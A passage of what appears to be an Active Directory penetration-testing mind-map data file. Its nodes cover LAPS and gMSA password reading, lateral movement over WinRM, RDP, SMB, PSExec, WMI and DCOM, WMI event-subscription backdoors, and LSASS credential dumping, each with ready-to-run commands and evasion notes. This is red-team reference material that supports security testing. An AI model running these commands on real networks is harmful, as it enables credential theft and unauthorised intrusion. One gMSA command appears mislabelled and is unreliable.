                                    description: 'Read LAPS password (PowerView)',
                                    code: 'Get-DomainComputer -Identity TARGET-PC -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
                                },
                                {
                                    description: 'LAPSToolkit enumeration',
                                    code: 'Find-LAPSDelegatedGroups'
                                },
                                {
                                    description: 'Get all LAPS passwords',
                                    code: 'Get-DomainComputer -Properties ms-mcs-admpwd | Where-Object {$."ms-mcs-admpwd" -ne $null} | Select-Object dnsHostName,ms-mcs-admpwd'
                                },
                                {
                                    description: 'Impacket LAPS extraction',
                                    code: 'netexec ldap DC-IP -u user -p password --module laps'
                                },
                                {
                                    description: 'CrackMapExec LAPS',
                                    code: 'crackmapexec ldap DC-IP -u user -p password -M laps'
                                }
                            ],
                            type: 'technique',
                            emoji: '🔑',
                            resources: [{
                                    title: 'LAPS Security',
                                    url: 'https://adsecurity.org/?p=3164'
                                },
                                {
                                    title: 'LAPSToolkit',
                                    url: 'https://github.com/leoloobeek/LAPSToolkit'
                                },
                                {
                                    title: 'LAPS Abuse Guide',
                                    url: 'https://www.hackingarticles.in/credential-dumping-local-administrator-password-solution-laps/'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'gmsa-abuse',
                        data: {
                            label: 'gMSA Password Extraction',
                            description: 'Group managed service account abuse',
                            descriptionMd: '### Group Managed Service Account (gMSA) Abuse\nExtract gMSA passwords from AD when you have read permissions on msDS-ManagedPassword attribute.\n\ngMSA Characteristics:\n* 256-character random password\n* Auto-rotated by AD (default 30 days)\n* Password stored in msDS-ManagedPassword (readable by authorized principals)\n* Often used for service accounts with elevated privileges\n\nAttack Scenario:\n1. Identify gMSAs and authorized readers\n2. Compromise principal with read access\n3. Extract gMSA password from AD\n4. Use credentials for lateral movement or privilege escalation\n\nValue: gMSAs often have service accounts with significant permissions (SQL, IIS, scheduled tasks, etc.)\n',
                            commands: [{
                                    description: 'Enumerate gMSAs',
                                    code: 'Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword'
                                },
                                {
                                    description: 'Find readable gMSAs',
                                    code: 'Get-DomainObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$.ObjectAceType -like "ms-DS-ManagedPassword"}'
                                },
                                {
                                    description: 'Read gMSA password (DSInternals)',
                                    code: 'Get-ADServiceAccount -Identity svc_gmsa -Properties msDS-ManagedPassword | Select-Object -ExpandProperty msDS-ManagedPassword'
                                },
                                {
                                    description: 'GMSAPasswordReader',
                                    code: 'gMSADumper.exe -d domain.com'
                                },
                                {
                                    description: 'Impacket gMSA extraction',
                                    code: 'GetUserSPNs.py -target-domain domain.com -request domain/user:password -outputfile gmsa-hashes'
                                }
                            ],
                            type: 'technique',
                            emoji: '🎫',
                            resources: [{
                                    title: 'gMSA Security',
                                    url: 'https://adsecurity.org/?p=4367'
                                },
                                {
                                    title: 'GMSAPasswordReader',
                                    url: 'https://github.com/rvazarkar/GMSAPasswordReader'
                                },
                                {
                                    title: 'DSInternals',
                                    url: 'https://github.com/MichaelGrafnetter/DSInternals'
                                }
                            ]
                        },
                        children: []
                    }
                ]
            },



            {
                id: 'ad-lateral',
                data: {
                    label: 'Lateral Movement',
                    description: 'Host Hopping',
                    descriptionMd: '### Lateral Movement\nMove between hosts using legitimate admin protocols and trust relationships, while validating segmentation assumptions.\n\n**Key Objectives:**\n* Expand access across the network\n* Reach high-value targets (DCs, servers, admin workstations)\n* Test network segmentation effectiveness\n* Validate credential reuse patterns\n* Assess monitoring and detection capabilities\n\n**Common Vectors:**\n* Remote management protocols (WinRM, RDP, SMB)\n* Service-based execution (PSExec, SCM)\n* WMI/DCOM-based execution\n* Scheduled tasks and services\n* Pass-the-hash and pass-the-ticket\n',
                    commands: [],
                    type: 'category',
                    emoji: '🔀',
                    resources: [{
                            title: 'Lateral Movement Guide',
                            url: 'https://attack.mitre.org/tactics/TA0008/'
                        },
                        {
                            title: 'Windows Lateral Movement',
                            url: 'https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/'
                        }
                    ]
                },
                children: [{
                        id: 'ad-remote-mgmt',
                        data: {
                            label: 'Remote Management',
                            description: 'WinRM, RDP, SMB admin shares',
                            descriptionMd: '### Remote Management Protocols\nAssess exposure of administrative protocols and whether access is restricted to management networks and privileged workstations.\n\n**Key Protocols:**\n* **WinRM (5985/5986)**: PowerShell remoting, management interfaces\n* **RDP (3389)**: Remote desktop access\n* **SMB (445)**: Admin shares (C$, ADMIN$), file operations\n* **SSH (22)**: OpenSSH on Windows Server 2019+\n\n**Access Requirements:**\n* Local administrator membership OR\n* Remote Management Users group (WinRM) OR\n* Remote Desktop Users group (RDP)\n\n**Security Considerations:**\n* Check for credential caching after connection\n* Validate network segmentation (tiering)\n* Test for restrictedadmin mode (RDP)\n* Verify authentication protocol requirements\n',
                            commands: [{
                                    description: 'Test WinRM connectivity',
                                    code: 'Test-WSMan -ComputerName TARGET'
                                },
                                {
                                    description: 'Enter PSSession',
                                    code: 'Enter-PSSession -ComputerName TARGET -Credential domain\\user'
                                },
                                {
                                    description: 'Remote command via WinRM',
                                    code: 'Invoke-Command -ComputerName TARGET -ScriptBlock {whoami} -Credential $cred'
                                },
                                {
                                    description: 'RDP connection',
                                    code: 'mstsc /v:TARGET /admin'
                                },
                                {
                                    description: 'Check SMB shares',
                                    code: 'net view \\\\TARGET /all'
                                },
                                {
                                    description: 'Access admin share',
                                    code: 'dir \\\\TARGET\\C$'
                                },
                                {
                                    description: 'CrackMapExec WinRM check',
                                    code: 'crackmapexec winrm TARGET -u user -p password'
                                },
                                {
                                    description: 'Evil-WinRM connection',
                                    code: 'evil-winrm -i TARGET -u user -p password'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧰',
                            resources: [{
                                    title: 'WinRM Security',
                                    url: 'https://docs.microsoft.com/en-us/windows/win32/winrm/portal'
                                },
                                {
                                    title: 'Evil-WinRM Tool',
                                    url: 'https://github.com/Hackplayers/evil-winrm'
                                },
                                {
                                    title: 'RDP Security Guide',
                                    url: 'https://adsecurity.org/?p=3299'
                                }
                            ]
                        },
                        children: [{
                                id: 'rdp-lateral',
                                data: {
                                    label: 'RDP Lateral Movement',
                                    description: 'Remote desktop compromise',
                                    descriptionMd: '### RDP-Based Lateral Movement\nUse Remote Desktop Protocol to move laterally, potentially harvesting credentials from active sessions.\n\n**RDP Attack Techniques:**\n* **Standard RDP**: Full interactive session (leaves credentials cached)\n* **Restricted Admin Mode**: Prevents credential caching (if enabled)\n* **Remote Credential Guard**: Protects credentials (Windows 10+/Server 2016+)\n* **Pass-the-Hash via RDP**: Possible with Restricted Admin enabled\n\n**Credential Harvesting Risk:**\n* Standard RDP caches credentials in LSASS\n* Session hijacking possible with SYSTEM privileges\n* Active sessions vulnerable to keystroke logging\n\n**Operational Security:**\n* Event ID 4624 (Type 10 logon)\n* Event ID 4778/4779 (session reconnect/disconnect)\n* Network connection logs\n',
                                    commands: [{
                                            description: 'RDP with saved creds',
                                            code: 'cmdkey /generic:TARGET /user:domain\\user /pass:password && mstsc /v:TARGET'
                                        },
                                        {
                                            description: 'RDP restricted admin',
                                            code: 'mstsc /v:TARGET /restrictedadmin'
                                        },
                                        {
                                            description: 'Pass-the-hash RDP',
                                            code: 'sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:"mstsc /v:TARGET /restrictedadmin"'
                                        },
                                        {
                                            description: 'RDP session hijack',
                                            code: 'tscon SESSION_ID /dest:CURRENT_SESSION'
                                        },
                                        {
                                            description: 'Query RDP sessions',
                                            code: 'qwinsta /server:TARGET'
                                        },
                                        {
                                            description: 'SharpRDP execution',
                                            code: 'SharpRDP.exe computername=TARGET command="cmd.exe /c whoami" username=user password=pass'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🖥️',
                                    resources: [{
                                            title: 'RDP Hijacking',
                                            url: 'https://www.kali.org/blog/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently/'
                                        },
                                        {
                                            title: 'Restricted Admin Mode',
                                            url: 'https://adsecurity.org/?p=3299'
                                        },
                                        {
                                            title: 'SharpRDP',
                                            url: 'https://github.com/0xthirteen/SharpRDP'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'winrm-lateral',
                                data: {
                                    label: 'WinRM Lateral Movement',
                                    description: 'PowerShell remoting abuse',
                                    descriptionMd: '### WinRM-Based Lateral Movement\nLeverage Windows Remote Management for stealthy command execution and interactive sessions.\n\n**WinRM Advantages:**\n* Built-in Windows management protocol\n* Often allowed through firewalls for admin\n* Supports encrypted communication\n* Less monitored than RDP in many environments\n* Can use CredSSP, Kerberos, or NTLM\n\n**Attack Vectors:**\n* Interactive PSSession\n* One-liner command execution\n* Script execution\n* Credential delegation attacks\n\n**Detection Evasion:**\n* HTTPS (5986) may bypass some inspection\n* Legitimate admin tool appearance\n* Can tunnel through allowed management ports\n',
                                    commands: [{
                                            description: 'New PSSession',
                                            code: '$s = New-PSSession -ComputerName TARGET -Credential $cred; Enter-PSSession $s'
                                        },
                                        {
                                            description: 'Invoke command',
                                            code: 'Invoke-Command -ComputerName TARGET -ScriptBlock {Get-Process} -Credential $cred'
                                        },
                                        {
                                            description: 'Execute script remotely',
                                            code: 'Invoke-Command -ComputerName TARGET -FilePath C:\\script.ps1 -Credential $cred'
                                        },
                                        {
                                            description: 'Multiple hosts',
                                            code: 'Invoke-Command -ComputerName TARGET1,TARGET2,TARGET3 -ScriptBlock {hostname} -Credential $cred'
                                        },
                                        {
                                            description: 'Evil-WinRM session',
                                            code: 'evil-winrm -i TARGET -u user -p password -s /scripts -e /exes'
                                        },
                                        {
                                            description: 'Pass-the-hash WinRM',
                                            code: 'evil-winrm -i TARGET -u user -H NTLMHASH'
                                        },
                                        {
                                            description: 'CrackMapExec WinRM exec',
                                            code: 'crackmapexec winrm TARGET -u user -p password -X "whoami"'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '⚡',
                                    resources: [{
                                            title: 'PowerShell Remoting Security',
                                            url: 'https://www.harmj0y.net/blog/powershell/trust-direction-an-enabler-for-active-directory-enumeration-and-trust-exploitation/'
                                        },
                                        {
                                            title: 'Evil-WinRM',
                                            url: 'https://github.com/Hackplayers/evil-winrm'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'smb-lateral',
                                data: {
                                    label: 'SMB Admin Shares',
                                    description: 'File-based lateral movement',
                                    descriptionMd: '### SMB Admin Share Access\nAccess administrative shares (C$, ADMIN$, IPC$) for file operations, credential extraction, and pivoting.\n\n**Default Admin Shares:**\n* **C$**: Root of C drive\n* **ADMIN$**: Windows directory (typically C:\\Windows)\n* **IPC$**: Inter-process communication\n* **[Drive]$**: Other drive roots\n\n**Requirements:**\n* Local administrator privileges\n* SMB (445/tcp) access\n* Admin$ share not disabled\n\n**Common Operations:**\n* Copy executables/scripts\n* Access SAM/SYSTEM registry hives\n* Read/modify configuration files\n* Stage payloads for execution\n* Extract credentials from disk\n',
                                    commands: [{
                                            description: 'List shares',
                                            code: 'net view \\\\TARGET /all'
                                        },
                                        {
                                            description: 'Access C$ share',
                                            code: 'dir \\\\TARGET\\C$\\Users'
                                        },
                                        {
                                            description: 'Copy file to remote',
                                            code: 'copy payload.exe \\\\TARGET\\C$\\Temp\\'
                                        },
                                        {
                                            description: 'Mount admin share',
                                            code: 'net use Z: \\\\TARGET\\C$ /user:domain\\user password'
                                        },
                                        {
                                            description: 'CrackMapExec SMB',
                                            code: 'crackmapexec smb TARGET -u user -p password --shares'
                                        },
                                        {
                                            description: 'SMBClient (Linux)',
                                            code: 'smbclient //TARGET/C$ -U domain/user%password'
                                        },
                                        {
                                            description: 'Impacket smbclient',
                                            code: 'smbclient.py domain/user:password@TARGET'
                                        },
                                        {
                                            description: 'Copy SAM hive',
                                            code: 'copy \\\\TARGET\\C$\\Windows\\System32\\config\\SAM .\\ '
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📁',
                                    resources: [{
                                            title: 'SMB Security',
                                            url: 'https://www.sans.org/blog/protecting-privileged-domain-accounts-restricted-admin-and-protected-users/'
                                        },
                                        {
                                            title: 'Admin Shares Overview',
                                            url: 'https://attack.mitre.org/techniques/T1021/002/'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'psexec',
                        data: {
                            label: 'Remote Exec (Service-based)',
                            description: 'Execution via admin channels',
                            descriptionMd: '### Service-Based Remote Execution\nValidate which identities can remotely execute and whether monitoring and hardening controls detect and block it.\n\n**PSExec Mechanism:**\n1. Connect to ADMIN$ share\n2. Upload PSEXESVC.exe to ADMIN$\n3. Create and start service via SCM\n4. Execute payload through service\n5. Return output via named pipe\n6. Clean up service and executable\n\n**Variants:**\n* **PSExec**: Original Sysinternals tool\n* **Impacket psexec**: Python implementation\n* **CrackMapExec**: Modern multi-protocol tool\n* **Metasploit psexec**: Framework module\n* **PAExec**: PSExec alternative with additional features\n\n**Detection Points:**\n* ADMIN$ access (Event 5145)\n* Service creation (Event 7045)\n* Service execution (Event 4688)\n* Named pipe creation\n* File write to ADMIN$\n',
                            commands: [{
                                    description: 'PSExec interactive',
                                    code: 'PsExec.exe \\\\TARGET -u domain\\user -p password cmd.exe'
                                },
                                {
                                    description: 'PSExec as SYSTEM',
                                    code: 'PsExec.exe \\\\TARGET -s cmd.exe'
                                },
                                {
                                    description: 'PSExec command execution',
                                    code: 'PsExec.exe \\\\TARGET -u domain\\user -p password ipconfig'
                                },
                                {
                                    description: 'Impacket psexec',
                                    code: 'psexec.py domain/user:password@TARGET'
                                },
                                {
                                    description: 'Impacket psexec hash',
                                    code: 'psexec.py -hashes :NTLMHASH domain/user@TARGET'
                                },
                                {
                                    description: 'CrackMapExec psexec',
                                    code: 'crackmapexec smb TARGET -u user -p password -x "whoami" --exec-method smbexec'
                                },
                                {
                                    description: 'Metasploit psexec',
                                    code: 'use exploit/windows/smb/psexec; set RHOST TARGET; set SMBUser user; set SMBPass password; run'
                                }
                            ],
                            type: 'tool',
                            emoji: '⬆️',
                            resources: [{
                                    title: 'PSExec Documentation',
                                    url: 'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec'
                                },
                                {
                                    title: 'Impacket PSExec',
                                    url: 'https://github.com/fortra/impacket/blob/master/examples/psexec.py'
                                },
                                {
                                    title: 'Detecting PSExec',
                                    url: 'https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf'
                                }
                            ]
                        },
                        children: [{
                                id: 'smbexec',
                                data: {
                                    label: 'SMBExec',
                                    description: 'Fileless service execution',
                                    descriptionMd: '### SMBExec - Fileless Remote Execution\nSimilar to PSExec but more stealthy by executing commands through services without dropping executables to disk.\n\n**Advantages over PSExec:**\n* No executable dropped to ADMIN$\n* Less forensic artifacts\n* Bypasses some AV/EDR detection\n* Uses only native Windows functionality\n\n**Mechanism:**\n1. Create service with command embedded in binPath\n2. Start service (command executes)\n3. Retrieve output via redirected file or pipe\n4. Delete service\n\n**Detection:** Service with unusual binPath (cmd.exe commands)\n',
                                    commands: [{
                                            description: 'Impacket smbexec',
                                            code: 'smbexec.py domain/user:password@TARGET'
                                        },
                                        {
                                            description: 'smbexec with hash',
                                            code: 'smbexec.py -hashes :NTLMHASH domain/user@TARGET'
                                        },
                                        {
                                            description: 'CrackMapExec smbexec',
                                            code: 'crackmapexec smb TARGET -u user -p password -x "whoami" --exec-method smbexec'
                                        },
                                        {
                                            description: 'smbexec specific command',
                                            code: 'smbexec.py domain/user:password@TARGET "ipconfig /all"'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '👻',
                                    resources: [{
                                            title: 'SMBExec vs PSExec',
                                            url: 'https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/'
                                        },
                                        {
                                            title: 'Impacket SMBExec',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/smbexec.py'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'atexec',
                                data: {
                                    label: 'AtExec',
                                    description: 'Scheduled task execution',
                                    descriptionMd: '### AtExec - Task Scheduler Remote Execution\nExecute commands remotely via scheduled tasks, providing an alternative to service-based methods.\n\n**Mechanism:**\n1. Connect to Task Scheduler service\n2. Create scheduled task\n3. Execute task immediately\n4. Retrieve output\n5. Delete task\n\n**Advantages:**\n* Different detection signature than PSExec\n* Uses Task Scheduler (common legitimate use)\n* Can run under different user contexts\n* Supports UAC bypass scenarios\n\n**Detection:** Event 4698 (scheduled task created) and 4699 (deleted)\n',
                                    commands: [{
                                            description: 'Impacket atexec',
                                            code: 'atexec.py domain/user:password@TARGET "whoami"'
                                        },
                                        {
                                            description: 'atexec with hash',
                                            code: 'atexec.py -hashes :NTLMHASH domain/user@TARGET "ipconfig"'
                                        },
                                        {
                                            description: 'CrackMapExec atexec',
                                            code: 'crackmapexec smb TARGET -u user -p password -x "hostname" --exec-method atexec'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '⏰',
                                    resources: [{
                                            title: 'Impacket AtExec',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/atexec.py'
                                        },
                                        {
                                            title: 'Scheduled Task Abuse',
                                            url: 'https://attack.mitre.org/techniques/T1053/005/'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'scshell',
                                data: {
                                    label: 'SCShell',
                                    description: 'Direct service creation',
                                    descriptionMd: '### SCShell - Service Control Manager Shell\nDirect interaction with Service Control Manager for command execution without common PSExec artifacts.\n\n**Key Differences:**\n* Direct SCM manipulation\n* Custom service creation patterns\n* Can avoid PSEXESVC.exe signatures\n* More granular control over service properties\n\n**Use Cases:**\n* Evasion when PSExec is blocked/detected\n* Custom service configuration needs\n* Specific user context requirements\n',
                                    commands: [{
                                            description: 'Create and run service',
                                            code: 'sc \\\\TARGET create evilsvc binPath= "cmd.exe /c whoami > C:\\output.txt" start= demand'
                                        },
                                        {
                                            description: 'Start service',
                                            code: 'sc \\\\TARGET start evilsvc'
                                        },
                                        {
                                            description: 'Query service',
                                            code: 'sc \\\\TARGET query evilsvc'
                                        },
                                        {
                                            description: 'Delete service',
                                            code: 'sc \\\\TARGET delete evilsvc'
                                        },
                                        {
                                            description: 'CrackMapExec service',
                                            code: 'crackmapexec smb TARGET -u user -p password --service-name customsvc -x "cmd /c calc"'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🔧',
                                    resources: [{
                                            title: 'Service Creation',
                                            url: 'https://attack.mitre.org/techniques/T1569/002/'
                                        },
                                        {
                                            title: 'SCShell Tool',
                                            url: 'https://github.com/Mr-Un1k0d3r/SCShell'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'wmiexec',
                        data: {
                            label: 'Remote Exec (WMI/DCOM)',
                            description: 'Management interface exposure',
                            descriptionMd: '### WMI/DCOM Remote Execution\nConfirm if WMI/DCOM is broadly reachable and whether endpoint controls constrain misuse.\n\n**WMI (Windows Management Instrumentation):**\n* Ports: 135 (RPC), 49152-65535 (dynamic RPC)\n* Powerful management framework\n* Semi-fileless execution capability\n* Often less monitored than SMB\n\n**DCOM (Distributed Component Object Model):**\n* Various objects (MMC20, ShellWindows, etc.)\n* Alternative execution method\n* Can bypass some security controls\n\n**Advantages:**\n* No service creation required\n* Fileless execution possible\n* Legitimate management traffic appearance\n* Multiple execution methods\n\n**Detection Challenges:**\n* Normal in enterprise environments\n* Encrypted by default\n* Harder to baseline\n',
                            commands: [{
                                    description: 'WMI command execution',
                                    code: 'wmic /node:TARGET /user:domain\\user /password:password process call create "cmd.exe /c whoami"'
                                },
                                {
                                    description: 'Impacket wmiexec',
                                    code: 'wmiexec.py domain/user:password@TARGET'
                                },
                                {
                                    description: 'wmiexec with hash',
                                    code: 'wmiexec.py -hashes :NTLMHASH domain/user@TARGET'
                                },
                                {
                                    description: 'CrackMapExec WMI',
                                    code: 'crackmapexec smb TARGET -u user -p password -x "ipconfig" --exec-method wmiexec'
                                },
                                {
                                    description: 'Invoke-WMIMethod',
                                    code: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName TARGET -Credential $cred'
                                },
                                {
                                    description: 'PowerShell WMI query',
                                    code: 'Get-WmiObject -Class Win32_Process -ComputerName TARGET -Credential $cred'
                                }
                            ],
                            type: 'tool',
                            emoji: '🧠',
                            resources: [{
                                    title: 'WMI Lateral Movement',
                                    url: 'https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf'
                                },
                                {
                                    title: 'Impacket WMIExec',
                                    url: 'https://github.com/fortra/impacket/blob/master/examples/wmiexec.py'
                                },
                                {
                                    title: 'WMI Attack Detection',
                                    url: 'https://www.darkoperator.com/blog/2017/10/14/basics-of-tracking-wmi-activity'
                                }
                            ]
                        },
                        children: [{
                                id: 'wmi-event-subscription',
                                data: {
                                    label: 'WMI Event Subscription',
                                    description: 'Persistence and execution',
                                    descriptionMd: '### WMI Event Subscription Abuse\nUse WMI event subscriptions for both persistence and remote code execution.\n\n**Components:**\n* **Event Filter**: Defines trigger condition\n* **Event Consumer**: Defines action to take\n* **Filter-Consumer Binding**: Links filter to consumer\n\n**Consumer Types:**\n* CommandLineEventConsumer (most common for attacks)\n* ActiveScriptEventConsumer (run VBScript/JScript)\n* SMTPEventConsumer, LogFileEventConsumer, etc.\n\n**Attack Uses:**\n* Persistence mechanism\n* Delayed/conditional execution\n* Trigger on system events\n* Stealthy compared to scheduled tasks\n',
                                    commands: [{
                                            description: 'List event filters',
                                            code: 'Get-WMIObject -Namespace root\\Subscription -Class __EventFilter'
                                        },
                                        {
                                            description: 'List event consumers',
                                            code: 'Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer'
                                        },
                                        {
                                            description: 'List bindings',
                                            code: 'Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding'
                                        },
                                        {
                                            description: 'Create filter (PowerShell)',
                                            code: '$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name="Backdoor";EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'";}'
                                        },
                                        {
                                            description: 'Create consumer',
                                            code: '$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name="Backdoor";CommandLineTemplate="powershell.exe -enc <payload>";}'
                                        },
                                        {
                                            description: 'Bind filter to consumer',
                                            code: 'Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer;}'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📡',
                                    resources: [{
                                            title: 'WMI Persistence',
                                            url: 'https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1'
                                        },
                                        {
                                            title: 'Event Subscription Detection',
                                            url: 'https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'dcom-lateral',
                                data: {
                                    label: 'DCOM Lateral Movement',
                                    description: 'Distributed COM abuse',
                                    descriptionMd: '### DCOM-Based Lateral Movement\nAbuse Distributed COM objects for remote code execution as an alternative to WMI.\n\n**Common DCOM Objects:**\n* **MMC20.Application** (49B2791A-B1AE-4C90-9B8E-E860BA07F889)\n* **ShellWindows** (9BA05972-F6A8-11CF-A442-00A0C90A8F39)\n* **ShellBrowserWindow** (C08AFD90-F2A1-11D1-8455-00A0C91F3880)\n* **Excel.Application**, **Outlook.Application** (if Office installed)\n\n**Advantages:**\n* Different IOCs than WMI/PSExec\n* Can bypass some security products\n* Uses legitimate COM infrastructure\n* Multiple execution paths\n\n**Requirements:**\n* Admin privileges on target\n* DCOM enabled (port 135 + dynamic ports)\n* Target object available\n',
                                    commands: [{
                                            description: 'MMC20 execution',
                                            code: '$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET")); $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")'
                                        },
                                        {
                                            description: 'Impacket dcomexec',
                                            code: 'dcomexec.py domain/user:password@TARGET'
                                        },
                                        {
                                            description: 'dcomexec with hash',
                                            code: 'dcomexec.py -hashes :NTLMHASH domain/user@TARGET'
                                        },
                                        {
                                            description: 'dcomexec specific object',
                                            code: 'dcomexec.py -object MMC20 domain/user:password@TARGET "whoami"'
                                        },
                                        {
                                            description: 'Invoke-DCOM PowerShell',
                                            code: 'Invoke-DCOM -ComputerName TARGET -Method MMC20.Application -Command "calc.exe"'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔌',
                                    resources: [{
                                            title: 'DCOM Lateral Movement',
                                            url: 'https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/'
                                        },
                                        {
                                            title: 'Impacket DCOMExec',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/dcomexec.py'
                                        },
                                        {
                                            title: 'Invoke-DCOM',
                                            url: 'https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'cred-hygiene',
                        data: {
                            label: 'Credential Hygiene',
                            description: 'Reuse, caching, session exposure',
                            descriptionMd: '### Credential Hygiene Assessment\nEvaluate how credentials appear on endpoints: cached logons, service creds, scheduled tasks, and session sprawl.\n\n**Credential Exposure Vectors:**\n* **LSASS memory**: Plaintext passwords, NTLM hashes, Kerberos tickets\n* **Registry**: LSA secrets, cached domain credentials\n* **Disk**: Credential Manager, browser passwords, config files\n* **Memory**: Application passwords, tokens\n* **Network**: Pass-the-hash, pass-the-ticket opportunities\n\n**Key Concerns:**\n* Domain admin credentials on workstations\n* Service account credential reuse\n* Cached credentials exposure\n* Excessive privileged session sprawl\n* Weak credential protection (no Credential Guard)\n\n**Attack Goals:**\n* Extract credentials from compromised hosts\n* Identify credential reuse patterns\n* Map privileged account exposure\n* Find high-value session targets\n',
                            commands: [{
                                    description: 'Mimikatz sekurlsa::logonpasswords',
                                    code: 'sekurlsa::logonpasswords'
                                },
                                {
                                    description: 'Dump all Mimikatz',
                                    code: 'sekurlsa::logonpasswords full'
                                },
                                {
                                    description: 'Mimikatz tickets',
                                    code: 'sekurlsa::tickets /export'
                                },
                                {
                                    description: 'Mimikatz ekeys',
                                    code: 'sekurlsa::ekeys'
                                },
                                {
                                    description: 'Dump LSA secrets',
                                    code: 'reg save HKLM\\SECURITY security.sav && reg save HKLM\\SYSTEM system.sav'
                                },
                                {
                                    description: 'Impacket secretsdump local',
                                    code: 'secretsdump.py -system system.sav -security security.sav LOCAL'
                                },
                                {
                                    description: 'ProcDump LSASS',
                                    code: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp'
                                },
                                {
                                    description: 'Parse with pypykatz',
                                    code: 'pypykatz lsa minidump lsass.dmp'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧼',
                            resources: [{
                                    title: 'Credential Theft',
                                    url: 'https://attack.mitre.org/techniques/T1003/'
                                },
                                {
                                    title: 'Mimikatz Guide',
                                    url: 'https://adsecurity.org/?page_id=1821'
                                },
                                {
                                    title: 'Pypykatz',
                                    url: 'https://github.com/skelsec/pypykatz'
                                }
                            ]
                        },
                        children: [{
                                id: 'lsass-dumping',
                                data: {
                                    label: 'LSASS Memory Dumping',
                                    description: 'Extract credentials from memory',
                                    descriptionMd: '### LSASS Memory Credential Extraction\nDump Local Security Authority Subsystem Service (LSASS) process memory to extract credentials offline.\n\n**Dumping Methods:**\n*Task Manager: Right-click lsass.exe → Create dump file\n* ProcDump: Sysinternals utility (less suspicious)\n* Mimikatz: Direct memory access\n* Comsvcs.dll: Native Windows DLL method\n* PPLDump: Bypass PPL protection\n* Nanodump: EDR evasion focused\n\nExtractable Credentials:\n* Plaintext passwords (WDigest enabled)\n* NTLM hashes\n* Kerberos tickets (TGT/TGS)\n* Kerberos encryption keys\n* CredSSP credentials\n\nDefenses:\n* Credential Guard (prevents plaintext/hash extraction)\n* PPL (Protected Process Light)\n* WDigest disabled\n* EDR monitoring\n',
                                    commands: [{
                                            description: 'ProcDump LSASS',
                                            code: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp'
                                        },
                                        {
                                            description: 'Comsvcs DLL method',
                                            code: 'rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full'
                                        },
                                        {
                                            description: 'Mimikatz online',
                                            code: 'privilege::debug\nsekurlsa::logonpasswords'
                                        },
                                        {
                                            description: 'Mimikatz offline',
                                            code: 'sekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords'
                                        },
                                        {
                                            description: 'Pypykatz parse dump',
                                            code: 'pypykatz lsa minidump lsass.dmp'
                                        },
                                        {
                                            description: 'Pypykatz live',
                                            code: 'pypykatz live lsa'
                                        },
                                        {
                                            description: 'Nanodump',
                                            code: 'nanodump.exe --write C:\temp\lsass.dmp'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '💾',
                                    resources: [{
                                            title: 'LSASS Credential Dumping',
                                            url: 'https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz'
                                        },
                                        {
                                            title: 'Nanodump',
                                            url: 'https://github.com/fortra/nanodump'
                                        },
                                        {
                                            title: 'Bypassing Credential Guard',
                                            url: 'https://teamhydra.blog/2020/08/25/bypassing-credential-guard/'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'sam-dumping',
                                data: {
